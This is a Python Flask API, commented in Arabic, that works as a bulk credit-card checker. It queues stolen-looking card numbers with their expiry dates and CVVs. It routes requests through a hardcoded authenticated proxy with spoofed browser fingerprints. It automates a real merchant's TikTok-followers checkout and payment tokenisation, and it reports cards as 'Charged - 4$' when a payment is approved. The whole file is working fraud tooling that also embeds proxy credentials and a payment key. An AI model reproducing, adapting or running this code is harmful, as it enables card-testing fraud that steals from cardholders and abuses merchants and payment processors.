from flask import Flask, request, jsonify
import threading
import time
import re
import random
import string
from curl_cffi import requests
from bs4 import BeautifulSoup
import json
import logging
from datetime import datetime
import queue

app = Flask(__name__)

# إعدادات التسجيل
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# تخزين النتائج
results = {}
results_lock = threading.Lock()
task_counter = 0
task_counter_lock = threading.Lock()

# قائمة انتظار المهام
task_queue = queue.Queue()
MAX_WORKERS = 20  # عدد المعالجات المتوازية

# قائمة اليوزرات
usernames = [
    "aabk", "aadb", "aaah", "aabj", "aaab", "aacf", "aada", "aace", "aabi", "aac9",
    "aacd", "aabh", "aaan", "aaaa", "aac8", "aaao", "aacc", "aabg", "aac7", "aaaf",
    "aacb", "aabf", "aaau", "aac6", "aaca", "aabe", "aac5", "aab9", "aabd", "aac4",
    "aabc", "aab8", "aaak", "aaag", "aac3", "aaap", "aab7", "aabb", "aac2", "aab6",
    "aaba", "aac1", "aab5", "aaa9", "aac0", "aab4", "aaa8", "aaae", "aacz", "aab3",
    "aaa7", "aacy", "aaam", "aab2", "aacx", "aaa5", "aab1", "aacw", "aaa4", "aab0",
    "aacv", "aaa3", "aabz", "aacu", "aaa2", "aaat", "aaby", "aact", "aaa1", "aaaq",
    "aabx", "aacs", "aaa0", "aabw", "aacr", "aaaz", "aaad", "aabv", "aaas", "aaav",
    "aacq", "aaay", "aabu", "aaa6", "aadl", "aacp", "aaaj", "aaar", "aaac", "aabt",
    "aadk", "aaco", "aaax", "aabs", "aadj", "aacn", "aabr", "aaaw", "aadi", "aacm",
    "aabq", "aadh", "aacl", "aabp", "aadg", "aack", "aabo", "aadf", "aacj", "aabn",
    "aade", "aaci", "aabm", "aadd", "aach", "aaai", "aabl", "aadc", "aacg", "aaal",
    "aady", "aadn", "aadw", "aads", "aadr", "aadx", "aad0", "aadv", "aadu", "aadq",
    "aadm", "aadz", "aadp", "aadt", "aado", "aad2", "aad1", "aad5", "aaec", "aad7",
    "aad8", "aaeb", "aaef", "aad4", "aad9", "aaea", "aad6", "aaed", "aad3", "aaee",
    "aaem", "aaeq", "aaej", "aaeg", "aaep", "aaet", "aaeh", "aaes", "aaei", "aaeu",
    "aaeo", "aael", "aaer", "aaen", "aaek", "aaey", "aae2", "aae3", "aae0", "aae6",
    "aaez", "aae4", "aae7", "aaev", "aae9", "aaex", "aae8", "aae5", "aae1", "aaew",
    "aafe", "aafc", "aafm", "aafb", "aaff", "aafd", "aafj", "aafo", "aafl", "aafi",
    "aafh", "aafg", "aafn", "aafa", "aafk", "aaft", "aafy", "aaf3", "aafr", "aafw",
    "aafq", "aaf0", "aaf1", "aafz", "aafs", "aaf2", "aafu", "aafx", "aafv", "aafp",
    "aaf6", "aaf5", "aaga", "aaf4", "aaf7", "aage", "aagi", "aagg", "aagf", "aaf8",
    "aagb", "aaf9", "aagd", "aagc", "aagh", "aago", "aagj", "aagr", "aagt", "aagw",
    "aagq", "aagn", "aagk", "aagu", "aags", "aagm", "aagl", "aagp", "aagx", "aagv",
    "aagz", "aagy", "aag1", "aag2", "aag4", "aag0", "aag3", "aag7", "aahb", "aag8",
    "aahc", "aag9", "aag6", "aaha", "aag5", "aahh", "aahf", "aahi", "aahg", "aahj",
    "aahd", "aahl", "aahk", "aaho", "aahq", "aahr", "aahn", "aahm", "aahp", "aahe",
    "aahx", "aahs", "aahu", "aaht", "aahv", "aahw", "aah2", "aahy", "aah6", "aah3",
    "aah1", "aah5", "aahz", "aah4", "aah0", "aah7", "aaid", "aaic", "aah8", "aaib",
    "aah9", "aaie", "aaia", "aaij", "aaik", "aaih", "aaig", "aaim", "aaii", "aail",
    "aaif", "aaio", "aaip", "aais", "aair", "aaiq", "aait", "aain", "aaiw", "aaiu",
    "aaix", "aaiz", "aaiv", "aai1", "aaiy", "aai0", "aai6", "aai4", "aai8", "aai7",
    "aai5", "aai3", "aai2", "aajc", "aajd", "aajb", "aajg", "aai9", "aaje", "aajf",
    "aaja", "aaji", "aajn", "aajj", "aajh", "aajk", "aajl", "aajm", "aajp", "aajq",
    "aajs", "aajr", "aaju", "aajv", "aajt", "aajo", "aaj2", "aaj0", "aajw", "aajy",
    "aaj1", "aajx", "aajz", "aaj3", "aaj4", "aaj5", "aaj8", "aaka", "aaj9", "aaj7",
    "aaj6", "aakf", "aakh", "aakg", "aakc", "aakb", "aakd", "aake", "aakk", "aakj",
    "aaki", "aako", "aakp", "aakl", "aakn", "aakm", "aakr", "aaks", "aakv", "aakt",
    "aakz", "aakw", "aakx", "aaky", "aaku", "aakq", "aak1", "aak3", "aak0", "aak5",
    "aak4", "aak2", "aak6", "aak9", "aalc", "aale", "aala", "aak8", "aald", "aak7",
    "aalb", "aalf", "aalh", "aalj", "aalg", "aalk", "aali", "aall"
]

def generate_gmail():
    """توليد بريد إلكتروني عشوائي"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"{username}@gmail.com"

def get_random_username():
    """اختيار يوزر عشوائي"""
    return random.choice(usernames)

def process_card(ccx, task_id):
    """معالجة بطاقة واحدة - تعمل في thread منفصل"""
    try:
        logger.info(f"Task {task_id}: Starting processing for card")
        
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            with results_lock:
                results[task_id] = {"status": "error", "message": "Invalid format"}
            return
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # إعداد البروكسي
        proxies = {
            'http': 'http://purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780',
            'https': 'http://purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780',
        }
        
        # إنشاء جلسة جديدة لكل طلب
        session = requests.Session(
            impersonate="chrome124",
            proxies=proxies,
            timeout=30,
        )
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        # ====== الخطوة 1: الحصول على الصفحة الأولى ======
        logger.info(f"Task {task_id}: Getting initial page")
        response = session.get('https://boostme.com/tiktok-followers/tiktok-account-information/100-followers')
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token = soup.find('input', {'name': 'socialboosting_platform_checkout_account_information[_token]'})['value']
        data = {
            'socialboosting_platform_checkout_account_information[handle]': get_random_username(),
            'socialboosting_platform_checkout_account_information[email]': generate_gmail(),
            'socialboosting_platform_checkout_account_information[packageId]': '',
            'socialboosting_platform_checkout_account_information[_token]': token,
        }
        
        response = session.post(
            'https://boostme.com/tiktok-followers/tiktok-account-information/100-followers',
            data=data,
            allow_redirects=True
        )
        
        # استخراج ID
        v2_match = re.search(r'/cart-summary/([a-f0-9-]+)', response.text)
        if not v2_match:
            with results_lock:
                results[task_id] = {"status": "error", "message": "Failed to get cart ID"}
            return
        cart_id = v2_match.group(1)
        logger.info(f"Task {task_id}: Cart ID: {cart_id}")
        
        # ====== الخطوة 2: جلب صفحة Cart Summary ======
        logger.info(f"Task {task_id}: Getting cart summary")
        response = session.get(f'https://boostme.com/cart-summary/{cart_id}')
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'socialboosting_checkout_cart_type[_token]'})
        token = token_input['value'] if token_input else None
        
        data = {
            'socialboosting_checkout_cart_type[package]': 'e3e32f1d-77d6-40cd-9c6d-ba8b25d0f3c6',
            'discount-code': '',
            'boostingRequestId': cart_id,
            'socialboosting_checkout_cart_type[_token]': token,
        }
        
        response = session.post(
            f'https://boostme.com/cart-summary/{cart_id}',
            data=data,
        )
        
        checkout_match = re.search(r'/solid-gate-checkout/create-payment/([a-f0-9]+)', response.text)
        if not checkout_match:
            with results_lock:
                results[task_id] = {"status": "error", "message": "Failed to get transaction ID"}
            return
        transaction_id = checkout_match.group(1)
        logger.info(f"Task {task_id}: Transaction ID: {transaction_id}")
        
        # ====== الخطوة 3: إنشاء Token ======
        logger.info(f"Task {task_id}: Creating token")
        data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'source': '16',
        }
        
        response = session.post('https://secure.nmi.com/token/api/create', headers=headers, data=data)
        token_id = response.json()['token']
        logger.info(f"Task {task_id}: Token created: {token_id}")
        
        # ====== الخطوة 4: إرسال بيانات البطاقة ======
        headers_json = {
            'authority': 'secure.nmi.com',
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://secure.nmi.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        # إرسال رقم البطاقة
        logger.info(f"Task {task_id}: Sending card number")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'ccnumber', 'value': n}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        # إرسال تاريخ الانتهاء
        logger.info(f"Task {task_id}: Sending expiry date")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'ccexp', 'value': f"{mm}{yy}"}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        # إرسال CVV
        logger.info(f"Task {task_id}: Sending CVV")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'cvv', 'cvvDisplay': True, 'value': cvc}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        # Lookup
        logger.info(f"Task {task_id}: Looking up token")
        json_data = {
            'tokenId': token_id,
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
        }
        session.post('https://secure.nmi.com/token/api/lookup', json=json_data)
        
        # ====== الخطوة 5: تنفيذ الدفع ======
        logger.info(f"Task {task_id}: Executing payment")
        json_data = {'token': token_id}
        response = session.post(
            f'https://boostme.com/nmi-checkout/create-payment/{transaction_id}',
            json=json_data,
            headers={
                'authority': 'boostme.com',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://boostme.com',
                'x-nmi-form': 'true',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
        )
        
        result = response.json()
        r = result.get('responsetext', '')
        logger.info(f"Task {task_id}: Response: {r}")
        
        # تخزين النتيجة
        with results_lock:
            if 'Approved' in r:
                results[task_id] = {
                    "status": "success", 
                    "message": "Charged - 4$ !", 
                    "details": r,
                    "card": f"{n[:4]}****{n[-4:]}"
                }
            else:
                results[task_id] = {
                    "status": "failed", 
                    "message": r,
                    "card": f"{n[:4]}****{n[-4:]}"
                }
        
        logger.info(f"Task {task_id}: Completed")
            
    except Exception as e:
        logger.error(f"Task {task_id}: Error - {str(e)}")
        with results_lock:
            results[task_id] = {"status": "error", "message": str(e)}

def worker_thread():
    """عامل يعمل في الخلفية لمعالجة المهام"""
    while True:
        try:
            task_id, ccx = task_queue.get(timeout=1)
            process_card(ccx, task_id)
            task_queue.task_done()
        except queue.Empty:
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Worker error: {str(e)}")
            task_queue.task_done()

# بدء العمال
logger.info(f"Starting {MAX_WORKERS} worker threads")
for i in range(MAX_WORKERS):
    t = threading.Thread(target=worker_thread, daemon=True)
    t.start()
    logger.info(f"Worker {i+1} started")

@app.route('/charge', methods=['POST'])
def charge_card():
    """نقطة نهاية لشحن بطاقة واحدة - تعود فوراً مع task_id"""
    try:
        data = request.get_json()
        if not data or 'cc' not in data:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        ccx = data['cc']
        
        # إنشاء معرف فريد للمهمة
        with task_counter_lock:
            global task_counter
            task_counter += 1
            task_id = task_counter
        
        # إضافة المهمة إلى قائمة الانتظار
        task_queue.put((task_id, ccx))
        
        # تخزين حالة مؤقتة
        with results_lock:
            results[task_id] = {"status": "queued", "message": "Task added to queue"}
        
        logger.info(f"Task {task_id}: Added to queue")
        
        return jsonify({
            "task_id": task_id,
            "status": "queued",
            "message": "Card processing started"
        }), 202
        
    except Exception as e:
        logger.error(f"Error in charge endpoint: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/charge/bulk', methods=['POST'])
def charge_bulk():
    """نقطة نهاية لشحن عدة بطاقات دفعة واحدة"""
    try:
        data = request.get_json()
        if not data or 'cards' not in data or not isinstance(data['cards'], list):
            return jsonify({"error": "Missing 'cards' list parameter"}), 400
        
        cards = data['cards']
        task_ids = []
        
        with task_counter_lock:
            global task_counter
            for ccx in cards:
                task_counter += 1
                task_id = task_counter
                task_queue.put((task_id, ccx))
                with results_lock:
                    results[task_id] = {"status": "queued", "message": "Task added to queue"}
                task_ids.append(task_id)
                logger.info(f"Task {task_id}: Added to queue (bulk)")
        
        return jsonify({
            "task_ids": task_ids,
            "total": len(task_ids),
            "status": "queued",
            "message": f"{len(task_ids)} cards added to queue"
        }), 202
        
    except Exception as e:
        logger.error(f"Error in bulk charge endpoint: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/status/<int:task_id>', methods=['GET'])
def get_status(task_id):
    """الحصول على حالة مهمة محددة"""
    with results_lock:
        if task_id in results:
            return jsonify({
                "task_id": task_id,
                "result": results[task_id]
            })
        else:
            return jsonify({
                "task_id": task_id,
                "status": "not_found",
                "message": "Task ID not found"
            }), 404

@app.route('/status/all', methods=['GET'])
def get_all_status():
    """الحصول على حالة جميع المهام"""
    with results_lock:
        # إرجاع آخر 100 نتيجة فقط لتجنب الحمل الزائد
        all_results = dict(list(results.items())[-100:])
        return jsonify({
            "total_tasks": len(results),
            "results": all_results
        })

@app.route('/health', methods=['GET'])
def health_check():
    """فحص صحي للخدمة"""
    return jsonify({
        "status": "healthy",
        "workers": MAX_WORKERS,
        "queue_size": task_queue.qsize(),
        "results_count": len(results),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/clear', methods=['POST'])
def clear_results():
    """مسح النتائج القديمة"""
    with results_lock:
        # الاحتفاظ فقط بآخر 50 نتيجة
        if len(results) > 50:
            keys = list(results.keys())
            for key in keys[:-50]:
                del results[key]
        return jsonify({
            "status": "cleared",
            "remaining": len(results)
        })

if __name__ == '__main__':
    logger.info("Starting Flask API server on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
